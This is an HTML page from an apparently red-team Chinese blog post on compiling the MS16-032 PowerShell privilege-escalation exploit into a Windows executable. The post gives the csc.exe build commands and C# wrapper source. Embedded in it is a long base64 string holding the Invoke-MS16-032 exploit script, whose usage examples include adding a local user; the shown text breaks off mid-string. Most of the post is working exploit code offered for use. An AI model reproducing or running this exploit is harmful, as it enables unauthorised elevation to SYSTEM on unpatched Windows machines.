@@ -1,0 +1,1578 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+
+
+
+
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=6.7.0">
+
+
+
+
+
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "198a1f28"
+    });
+  daovoice('update');
+  </script>
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    fastclick: true,
+    lazyload: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="授人以鱼不如授人以渔 之前的MS16-032是个powershell脚本，怎么样改成exe呢，很简单。使用.net直接简单的修改编译就可以了。已经改好的代码在这里： 戳我 gist貌似被墙了，我在这里也贴一下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152">
+<meta name="keywords" content="Red Team;Hack;半吊子程序猿,web;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="编译你的Powershell( MS16-032为例)">
+<meta property="og:url" content="https://evi1cg.github.io/archives/Compile_Your_Powreshell_Script.html">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
+<meta property="og:description" content="授人以鱼不如授人以渔 之前的MS16-032是个powershell脚本，怎么样改成exe呢，很简单。使用.net直接简单的修改编译就可以了。已经改好的代码在这里： 戳我 gist貌似被墙了，我在这里也贴一下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-01-14T14:44:26.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="编译你的Powershell( MS16-032为例)">
+<meta name="twitter:description" content="授人以鱼不如授人以渔 之前的MS16-032是个powershell脚本，怎么样改成exe呢，很简单。使用.net直接简单的修改编译就可以了。已经改好的代码在这里： 戳我 gist貌似被墙了，我在这里也贴一下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Evi1cg's blog" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://evi1cg.github.io/archives/Compile_Your_Powreshell_Script.html">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>编译你的Powershell( MS16-032为例) | Evi1cg's blog</title>
+  
+
+
+
+
+  <script async src="//www.googletagmanager.com/gtag/js?id=UA-132188022-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-132188022-1');
+  </script>
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  <script type="text/javascript" src="/js/src/love.js"></script>
+</head>
+
+<body itemscope="" itemtype="https://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="https://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Evi1cg's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-归档 menu-item-active">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archive" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-工具">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tools" rel="section"><i class="menu-item-icon fa fa-fw fa-briefcase"></i> <br>工具</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-友链">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/friends" rel="section"><i class="menu-item-icon fa fa-fw fa-link"></i> <br>友链</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="https://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://evi1cg.github.io/archives/Compile_Your_Powreshell_Script.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+      <meta itemprop="name" content="Evi1cg">
+      <meta itemprop="description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
+      <meta itemprop="name" content="Evi1cg's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">编译你的Powershell( MS16-032为例)
+
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2016-06-30 05:20:00" itemprop="dateCreated datePublished" datetime="2016-06-30T05:20:00+08:00">2016-06-30</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing"><a href="/categories/渗透案例/" itemprop="url" rel="index"><span itemprop="name">渗透案例</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <a href="/archives/Compile_Your_Powreshell_Script.html#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/archives/Compile_Your_Powreshell_Script.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>授人以鱼不如授人以渔</p>
+<p>之前的MS16-032是个powershell脚本，怎么样改成exe呢，很简单。使用.net直接简单的修改编译就可以了。已经改好的代码在这里：</p>
+<p><a href="https://gist.github.com/Ridter/e03bb269b50d2be62fb6c5a973f7b52d" target="_blank" rel="noopener">戳我</a></p>
+<p>gist貌似被墙了，我在这里也贴一下：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Author: Evilcg, Twitter: @Evilcg</span></span><br><span class="line"><span class="comment">Step One:</span></span><br><span class="line"><span class="comment">PS C:\&gt; [psobject].Assembly.Location</span></span><br><span class="line"><span class="comment">C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll</span></span><br><span class="line"><span class="comment">Step Two:</span></span><br><span class="line"><span class="comment">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /reference:"C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" /out:MS16_032.exe MS16_032.cs</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Windows 10 reference may be Here: C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35</span></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Collections.ObjectModel;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation.Host;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation.Runspaces;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ConsoleApplication1</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">string</span> _application;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">string</span> _commandline;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">       <span class="keyword">if</span> (args.Length == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        System.Console.WriteLine(<span class="string">"Usage: MS16_032.exe calc.exe OR MS16_032.exe cmd.exe \"/c clac.exe\""</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> (args.Length ==<span class="number">1</span>)</span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">        _application = args[<span class="number">0</span>];     </span><br><span class="line">        PowerShellExecutor t = <span class="keyword">new</span> PowerShellExecutor();</span><br><span class="line">        t.ExecuteSynchronously(_application, <span class="string">""</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(args.Length == <span class="number">2</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        _application = args[<span class="number">0</span>];</span><br><span class="line">        _commandline = args[<span class="number">1</span>];</span><br><span class="line">        PowerShellExecutor t = <span class="keyword">new</span> PowerShellExecutor();</span><br><span class="line">        t.ExecuteSynchronously(_application, _commandline);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">class</span> <span class="title">PowerShellExecutor</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> PSInvoke_MS16_032 = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(<span class="string">@"ZnVuY3Rpb24gSW52b2tlLU1TMTYtMDMyIHsKPCMKLlNZTk9QU0lTCiAgICAKICAgIFBvd2VyU2hlbGwgaW1wbGVtZW50YXRpb24gb2YgTVMxNi0wMzIuIFRoZSBleHBsb2l0IHRhcmdldHMgYWxsIHZ1bG5lcmFibGUKICAgIG9wZXJhdGluZyBzeXN0ZW1zIHRoYXQgc3VwcG9ydCBQb3dlclNoZWxsIHYyKy4gQ3JlZGl0IGZvciB0aGUgZGlzY292ZXJ5IG9mCiAgICB0aGUgYnVnIGFuZCB0aGUgbG9naWMgdG8gZXhwbG9pdCBpdCBnbyB0byBKYW1lcyBGb3JzaGF3IChAdGlyYW5pZGRvKS4KICAgIAogICAgVGFyZ2V0czoKICAgIAogICAgKiBXaW43LVdpbjEwICYgMms4LTJrMTIgPD09IDMyLzY0IGJpdCEKICAgICogVGVzdGVkIG9uIHgzMiBXaW43LCB4NjQgV2luOCwgeDY0IDJrMTJSMgogICAgCiAgICBOb3RlczoKICAgIAogICAgKiBJbiBvcmRlciBmb3IgdGhlIHJhY2UgY29uZGl0aW9uIHRvIHN1Y2NlZWQgdGhlIG1hY2hpbmUgbXVzdCBoYXZlIDIrIENQVQogICAgICBjb3Jlcy4gSWYgdGVzdGluZyBpbiBhIFZNIGp1c3QgbWFrZSBzdXJlIHRvIGFkZCBhIGNvcmUgaWYgbmVlZGVkIG1rYXkuCiAgICAqIFRoZSBleHBsb2l0IGlzIHByZXR0eSByZWxpYWJsZSwgaG93ZXZlciB+MS82IHRpbWVzIGl0IHdpbGwgc2F5IGl0IHN1Y2NlZWRlZAogICAgICBidXQgbm90IHNwYXduIGEgc2hlbGwuIE5vdCBzdXJlIHdoYXQgdGhlIGlzc3VlIGlzIGJ1dCBqdXN0IHJlLXJ1biBhbmQgcHJvZml0IQogICAgKiBXYW50IHRvIGtub3cgbW9yZSBhYm91dCBNUzE2LTAzMiA9PT4KICAgICAgaHR0cHM6Ly9nb29nbGVwcm9qZWN0emVyby5ibG9nc3BvdC5jby51ay8yMDE2LzAzL2V4cGxvaXRpbmctbGVha2VkLXRocmVhZC1oYW5kbGUuaHRtbAoKLkRFU0NSSVBUSU9OCiAgICBBdXRob3I6IFJ1YmVuIEJvb25lbiAoQEZ1enp5U2VjKQogICAgQmxvZzogaHR0cDovL3d3dy5mdXp6eXNlY3VyaXR5LmNvbS8KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBQb3dlclNoZWxsIHYyKwogICAgT3B0aW9uYWwgRGVwZW5kZW5jaWVzOiBOb25lCgouUEFSQU1FVEVSIEFwcGxpY2F0aW9uCgpTcGVjaWZpZXMgYW4gQXBwbGljYXRpb24gdG8gcnVuLgoKLlBBUkFNRVRFUiBDb21tYW5kbGluZQoKU3BlY2lmaWVzIENvbW1hbmRsaW5lLCBzdWNoIGFzIG5ldCB1c2VyIHh4eCB4eHggL2FkZAogICAgCi5FWEFNUExFCiAgICBDOlxQUz4gSW52b2tlLU1TMTYtMDMyIC1BcHBsaWNhdGlvbiBDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUKICAgIEM6XFBTPiBJbnZva2UtTVMxNi0wMzIgLUFwcGxpY2F0aW9uIEM6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZSAtQ29tbWFuZGxpbmUgIi9jIG5ldCB1c2VyIDEgMSAvYWRkIgoKIz4KICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlclNldE5hbWUgPSAnQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlJyApXQogICAgICAgIFtzdHJpbmddCiAgICAgICAgJEFwcGxpY2F0aW9uLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW3N0cmluZ10KICAgICAgICAkQ29tbWFuZGxpbmUKICAgICAgICApCgoKICAgIEFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiBAIgogICAgdXNpbmcgU3lzdGVtOwogICAgdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOwogICAgdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwogICAgdXNpbmcgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbDsKICAgIAogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHVibGljIHN0cnVjdCBQUk9DRVNTX0lORk9STUFUSU9OCiAgICB7CiAgICAgICAgcHVibGljIEludFB0ciBoUHJvY2VzczsKICAgICAgICBwdWJsaWMgSW50UHRyIGhUaHJlYWQ7CiAgICAgICAgcHVibGljIGludCBkd1Byb2Nlc3NJZDsKICAgICAgICBwdWJsaWMgaW50IGR3VGhyZWFkSWQ7CiAgICB9CiAgICAKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0PUNoYXJTZXQuVW5pY29kZSldCiAgICBwdWJsaWMgc3RydWN0IFNUQVJUVVBJTkZPCiAgICB7CiAgICAgICAgcHVibGljIEludDMyIGNiOwogICAgICAgIHB1YmxpYyBzdHJpbmcgbHBSZXNlcnZlZDsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwRGVza3RvcDsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwVGl0bGU7CiAgICAgICAgcHVibGljIEludDMyIGR3WDsKICAgICAgICBwdWJsaWMgSW50MzIgZHdZOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1hTaXplOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1lTaXplOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1hDb3VudENoYXJzOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1lDb3VudENoYXJzOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd0ZpbGxBdHRyaWJ1dGU7CiAgICAgICAgcHVibGljIEludDMyIGR3RmxhZ3M7CiAgICAgICAgcHVibGljIEludDE2IHdTaG93V2luZG93OwogICAgICAgIHB1YmxpYyBJbnQxNiBjYlJlc2VydmVkMjsKICAgICAgICBwdWJsaWMgSW50UHRyIGxwUmVzZXJ2ZWQyOwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZElucHV0OwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZE91dHB1dDsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRFcnJvcjsKICAgIH0KICAgIAogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHVibGljIHN0cnVjdCBTUU9TCiAgICB7CiAgICAgICAgcHVibGljIGludCBMZW5ndGg7CiAgICAgICAgcHVibGljIGludCBJbXBlcnNvbmF0aW9uTGV2ZWw7CiAgICAgICAgcHVibGljIGludCBDb250ZXh0VHJhY2tpbmdNb2RlOwogICAgICAgIHB1YmxpYyBib29sIEVmZmVjdGl2ZU9ubHk7CiAgICB9CiAgICAKICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgQWR2YXBpMzIKICAgIHsKICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSwgQ2hhclNldD1DaGFyU2V0LlVuaWNvZGUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgQ3JlYXRlUHJvY2Vzc1dpdGhMb2dvblcoCiAgICAgICAgICAgIFN0cmluZyB1c2VyTmFtZSwKICAgICAgICAgICAgU3RyaW5nIGRvbWFpbiwKICAgICAgICAgICAgU3RyaW5nIHBhc3N3b3JkLAogICAgICAgICAgICBpbnQgbG9nb25GbGFncywKICAgICAgICAgICAgU3RyaW5nIGFwcGxpY2F0aW9uTmFtZSwKICAgICAgICAgICAgU3RyaW5nIGNvbW1hbmRMaW5lLAogICAgICAgICAgICBpbnQgY3JlYXRpb25GbGFncywKICAgICAgICAgICAgaW50IGVudmlyb25tZW50LAogICAgICAgICAgICBTdHJpbmcgY3VycmVudERpcmVjdG9yeSwKICAgICAgICAgICAgcmVmICBTVEFSVFVQSU5GTyBzdGFydHVwSW5mbywKICAgICAgICAgICAgb3V0IFBST0NFU1NfSU5GT1JNQVRJT04gcHJvY2Vzc0luZm9ybWF0aW9uKTsKICAgICAgICAgICAgCiAgICAgICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgU2V0VGhyZWFkVG9rZW4oCiAgICAgICAgICAgIHJlZiBJbnRQdHIgVGhyZWFkLAogICAgICAgICAgICBJbnRQdHIgVG9rZW4pOwogICAgICAgICAgICAKICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBPcGVuVGhyZWFkVG9rZW4oCiAgICAgICAgICAgIEludFB0ciBUaHJlYWRIYW5kbGUsCiAgICAgICAgICAgIGludCBEZXNpcmVkQWNjZXNzLAogICAgICAgICAgICBib29sIE9wZW5Bc1NlbGYsCiAgICAgICAgICAgIG91dCBJbnRQdHIgVG9rZW5IYW5kbGUpOwogICAgICAgICAgICAKICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBPcGVuUHJvY2Vzc1Rva2VuKAogICAgICAgICAgICBJbnRQdHIgUHJvY2Vzc0hhbmRsZSwgCiAgICAgICAgICAgIGludCBEZXNpcmVkQWNjZXNzLAogICAgICAgICAgICByZWYgSW50UHRyIFRva2VuSGFuZGxlKTsKICAgICAgICAgICAgCiAgICAgICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBleHRlcm4gc3RhdGljIGJvb2wgRHVwbGljYXRlVG9rZW4oCiAgICAgICAgICAgIEludFB0ciBFeGlzdGluZ1Rva2VuSGFuZGxlLAogICAgICAgICAgICBpbnQgU0VDVVJJVFlfSU1QRVJTT05BVElPTl9MRVZFTCwKICAgICAgICAgICAgcmVmIEludFB0ciBEdXBsaWNhdGVUb2tlbkhhbmRsZSk7CiAgICB9CiAgICAKICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgS2VybmVsMzIKICAgIHsKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiB1aW50IEdldExhc3RFcnJvcigpOwogICAgCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDdXJyZW50UHJvY2VzcygpOwogICAgCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDdXJyZW50VGhyZWFkKCk7CiAgICAgICAgCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBHZXRUaHJlYWRJZChJbnRQdHIgaFRocmVhZCk7CiAgICAgICAgCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IEdldFByb2Nlc3NJZE9mVGhyZWFkKEludFB0ciBoYW5kbGUpOwogICAgICAgIAogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBTdXNwZW5kVGhyZWFkKEludFB0ciBoVGhyZWFkKTsKICAgICAgICAKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLFNldExhc3RFcnJvcj10cnVlKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgUmVzdW1lVGhyZWFkKEludFB0ciBoVGhyZWFkKTsKICAgICAgICAKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICAgICAgcHVi